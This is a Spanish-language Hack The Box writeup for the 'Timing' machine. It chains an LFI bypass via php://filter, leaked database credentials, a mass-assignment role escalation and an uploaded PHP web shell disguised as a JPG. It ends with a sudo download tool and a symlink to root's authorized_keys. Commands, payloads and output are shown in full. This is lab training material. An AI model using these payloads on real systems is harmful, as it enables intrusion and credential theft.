---
layout: post
title: Timing
date: 2023-03-28
description:
img:
fig-caption:
tags: [eWPT, OSCP (Intrusión), eWPTX2, eCPPTv2, eCPTX]
---
___

<center><img src="/writeups/assets/img/Timing-htb/Timing.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* LFI

* Análisis de código PHP

* Mass Assigment Attact

* Arbitrary File Upload

* Abuso de privilegio sudoers (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.135 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 12:49 GMT
Nmap scan report for 10.10.11.135
Host is up (0.086s latency).
Not shown: 63181 closed tcp ports (reset), 2352 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.58 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.135 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 12:50 GMT
Nmap scan report for 10.10.11.135
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d25c40d7c9feffa883c36ecd6011d2eb (RSA)
|   256 18c9f7b92736a116592335843431b3ad (ECDSA)
|_  256 a22deedb4ebff93f8bd4cfb412d820f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnoogías que está empleando el servidor web

```null
whatweb http://10.10.11.135
http://10.10.11.135 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], RedirectLocation[./login.php]
http://10.10.11.135/login.php [200 OK] Apache[2.4.29], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[#,dkstudioin@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], JQuery, Script, Title[Simple WebApp]
```

La página principal se ve así:

<img src="/writeups/assets/img/Timing-htb/1.png" alt="">

Aplico fuzzing para descubrir archivos

```null
gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.135/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/28 12:55:32 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/footer.php           (Status: 200) [Size: 3937]
/header.php           (Status: 302) [Size: 0] [--> ./login.php]
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]
/.htaccess            (Status: 403) [Size: 277]
/.                    (Status: 302) [Size: 0] [--> ./login.php]
/login.php            (Status: 200) [Size: 5609]
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]
/.htpasswd            (Status: 403) [Size: 277]
/image.php            (Status: 200) [Size: 0]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/wp-forum.phps        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
Progress: 16200 / 16245 (99.72%)
===============================================================
2023/03/28 12:55:49 Finished
===============================================================
```

Pero tengo que estar loggeado para poder acceder a ellos. Intento un LFI en ```/image.php```

```null
gobuster fuzz -u 'http://10.10.11.135/image.php?FUZZ=../../../../../../../etc/passwd' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 --exclude-length 0
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.10.11.135/image.php?FUZZ=../../../../../../../etc/passwd
[+] Method:           GET
[+] Threads:          100
[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Exclude Length:   0
[+] User Agent:       gobuster/3.5
[+] Timeout:          10s
===============================================================
2023/03/28 14:42:29 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=25] http://10.10.11.135/image.php?img=../../../../../../../etc/passwd
```

Me sale una advertencia

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=../../../../../../../etc/passwd'
Hacking attempt detected!
```

Pero se puede burlar con un wrapper de codificación en base64

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64_encode/resource=/etc/passwd' | grep sh$
root:x:0:0:root:/root:/bin/bash
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

Este servicio está corriendo en la máquina víctima

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64_encode/resource=/proc/net/fib_trie' | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u
0.0.0.0
10.10.10.0
10.10.11.128
10.10.11.135
10.10.11.255
1 2 0 2
127.0.0.0
127.0.0.1
127.255.255.255
23 2 1 2
25 2 0 2
31 1 0 0
4 2 0 2
8 2 0 2
```

Las credenciales para el panel de autenticación son ```aaron:aaron```

<img src="/writeups/assets/img/Timing-htb/2.png" alt="">

Sigo sin acceso para el ```upload.php```

```null
HTTP/1.1 302 Found
Date: Tue, 28 Mar 2023 14:50:06 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ./index.php
Content-Length: 35
Connection: close
Content-Type: text/html; charset=UTF-8

No permission to access this panel!
```

Me traigo el ```image.php``` para ver su contenido

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=image.php' | base64 -d
<?php

function is_safe_include($text)
{
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";

}

if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}
```

Lo mismo para el ```upload.php```

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php' | base64 -d
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

Se está importando el archivo ```admin_auth_check.php```, así que también lo veo

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php' | base64 -d
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}

?>
```

En base al role que esté asignado, se va a validar si es un usuario Administrador o no

Ahora el ```auth_check.php```

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=auth_check.php' | base64 -d
<?php

//ini_set('display_errors', '1');
//ini_set('display_startup_errors', '1');
//error_reporting(E_ALL);

// session is valid for 1 hour
ini_set('session.gc_maxlifetime', 3600);
session_set_cookie_params(3600);

session_start();
if (!isset($_SESSION['userid']) && strpos($_SERVER['REQUEST_URI'], "login.php") === false) {
    header('Location: ./login.php');
    die();
}
?>
```

Me descargo también el ```profile.php`` 

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=profile.php' | base64 -d
<?php
include_once "header.php";

include_once "db_conn.php";

$id = $_SESSION['userid'];


// fetch updated user
$statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$result = $statement->execute(array('id' => $id));
$user = $statement->fetch();


?>

<script src="js/profile.js"></script>


<div class="container bootstrap snippets bootdey">

    <div class="alert alert-success" id="alert-profile-update" style="display: none">
        <strong>Success!</strong> Profile was updated.
    </div>

    <h1 class="text-primary"><span class="glyphicon glyphicon-user"></span>Edit Profile</h1>
    <hr>
    <div class="row">
        <!-- left column -->
        <div class="col-md-1">
        </div>

        <!-- edit form column -->
        <div class="col-md-9 personal-info">
            <h3>Personal info</h3>
            <form class="form-horizontal" role="form" id="editForm" action="#" method="POST">
                <div class="form-group">
                    <label class="col-lg-3 control-label">First name:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="firstName" id="firstName"
                               value="<?php if (!empty($user['firstName'])) echo $user['firstName']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Last name:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="lastName" id="lastName"
                               value="<?php if (!empty($user['lastName'])) echo $user['lastName']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Company:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="company" id="company"
                               value="<?php if (!empty($user['company'])) echo $user['company']; ?>">
                    </div>
                </div>
                <div class="form-group">
                    <label class="col-lg-3 control-label">Email:</label>
                    <div class="col-lg-8">
                        <input class="form-control" type="text" name="email" id="email"
                               value="<?php if (!empty($user['email'])) echo $user['email']; ?>">
                    </div>
                </div>

                <div class="container">
                    <div class="row">
                        <div class="col-md-9 bg-light text-right">

                            <button type="button" onclick="updateProfile()" class="btn btn-primary">
                                Update
                            </button>

                        </div>
                    </div>
                </div>

            </form>
        </div>
    </div>
</div>
<hr>

<?php
include_once "footer.php";
?>
```

Se está incluyendo ```db_conn.php```

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php' | base64 -d
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Contiene credenciales de acceso a la base de datos, El formato de subida de archivos sería el siguiente:

```null
php --interactive
Interactive shell

php > echo md5('$file_hash' . time()) . "_" . "cmd.jpg";
ca4d0785338026a2b224642b131048f5_cmd.jpg
```

En ```upload.php``` hay un error y se está introduciendo ```$file_hash``` entre comillas simples, lo que hace que se mantenga estático

Puedo editar mi perfil

<img src="/writeups/assets/img/Timing-htb/3.png" alt="">

Se puede efectuar un Mass Asigment Attack, añadiendo más campos en la data por POST. Modifico mi role para que valga 1

```null
POST /profile_update.php HTTP/1.1
Host: 10.10.11.135
Content-Length: 59
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.11.135
Referer: http://10.10.11.135/profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=onjjs1ql6bhooavmijd5m3elf5
Connection: close

firstName=test&lastName=test&email=test&company=test&role=1
```

```null
HTTP/1.1 200 OK
Date: Wed, 29 Mar 2023 08:09:20 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 419
Connection: close
Content-Type: text/html; charset=UTF-8

{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "1",
    "6": "1",
    "company": "test",
    "7": "test"
}
```

Ya no tengo ese problema en el ```upload.php```

```null
curl -s -X GET 'http://10.10.11.135/upload.php' -H "Cookie: PHPSESSID=onjjs1ql6bhooavmijd5m3elf5"
Error: This extension is not allowed.
```

Desde el panel de Administrador, intercepto la petición que se encarga de subir la imagen

```null
POST /upload.php HTTP/1.1
Host: 10.10.11.135
Content-Length: 222
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryn7DLq2AxO2f5p4rA
Accept: */*
Origin: http://10.10.11.135
Referer: http://10.10.11.135/avatar_uploader.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=onjjs1ql6bhooavmijd5m3elf5
Connection: close

------WebKitFormBoundaryn7DLq2AxO2f5p4rA
Content-Disposition: form-data; name="fileToUpload"; filename="cmd.jpg"
Content-Type: image/jpeg

<?php
  system($_GET['cmd']);
?>

------WebKitFormBoundaryn7DLq2AxO2f5p4rA--
```

```null
HTTP/1.1 200 OK
Date: Wed, 29 Mar 2023 08:55:27 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 27
Connection: close
Content-Type: text/html; charset=UTF-8

The file has been uploaded.
```

Una vez subido, puedo acceder a él desde ```/images/uploads```

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=images/uploads/ae5ad6937c9c202e70da2aa9b425fdfd_cmd.jpg&cmd=whoami'
www-data
```

No tengo conectividad con mi equipo

```null
curl -s -X GET 'http://10.10.11.135/image.php?img=images/uploads/ae5ad6937c9c202e70da2aa9b425fdfd_cmd.jpg&cmd=ping+-c1+10.10.16.2'
PING 10.10.16.2 (10.10.16.2) 56(84) bytes of data.
From 10.10.11.135 icmp_seq=1 Destination Port Unreachable

--- 10.10.16.2 ping statistics ---
1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms
```

Creo una pseudoconsola con bash

```null
#!/bin/bash

function ctrl_c(){
  echo
  exit 1
}

trap ctrl_c INT


while true; do
  echo -n "[#] - " && read -r command
  command=$(echo $command | tr ' ' '+')
  curl -s -X GET "http://10.10.11.135/image.php?img=images/uploads/ae5ad6937c9c202e70da2aa9b425fdfd_cmd.jpg&cmd=$command"
done
```

En el directorio ```/opt``` hay un backup

```null
[#] - ls -l /opt
total 616
-rw-r--r-- 1 root root 627851 Jul 20  2021 source-files-backup.zip
```

Para transferirlo a mi equipo, creo una copia que sea accessible desde la web

```null
wget http://10.10.11.135/source-files-backup.zip
```

Lo descomprimo en un directorio

```null
unzip source-files-backup.zip -d backup
```

Este repositorio GIT tiene dos commits

```null
git log
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

    init
```

Se modificó la contraseña de la base de datos

```null
git diff e4e214696159a25c69812571c8214d2bf8736a3f
diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Se reutiliza por SSH para el usuario ```aaron```

```null
 ssh aaron@10.10.11.135
aaron@10.10.11.135's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 29 09:29:37 UTC 2023

  System load:  0.0               Processes:           169
  Usage of /:   52.8% of 4.85GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.11.135
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


aaron@timing:~$ cat user.txt 
d85898836e6715fce12283afe4ca0d88
```

Puedo ejecutar un commando como cualquier usuario sin proporcionar contraseña

```null
aaron@timing:~$ sudo -l 
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

Descarga un archivo que le indique y lo almacena

```null
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.16.2/cmd.jpg
Initializing download: http://10.10.16.2/cmd.jpg
File size: 33 bytes
Opening output file cmd.jpg.0
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 33 byte in 0 seconds. (0.04 KB/s)
```

El propietario es root

```null
-rw-r--r-- 1 root  root    33 Mar 29 09:39 cmd.jpg
```

Creo un link simbólico para que mi clave pública una vez descargada se convierta en las authorized_keys del usuario root

```null
aaron@timing:~$ ln -s -f /root/.ssh/authorized_keys id_rsa.pub
```

Me conecto sin proporcionar contraseña

```null
ssh root@10.10.11.135
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 29 09:46:38 UTC 2023

  System load:  0.13              Processes:           176
  Usage of /:   52.8% of 4.85GB   Users logged in:     1
  Memory usage: 18%               IP address for eth0: 10.10.11.135
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@timing:~# cat root.txt 
d6ad9b0dd1a3985a849ef6981332b92d
```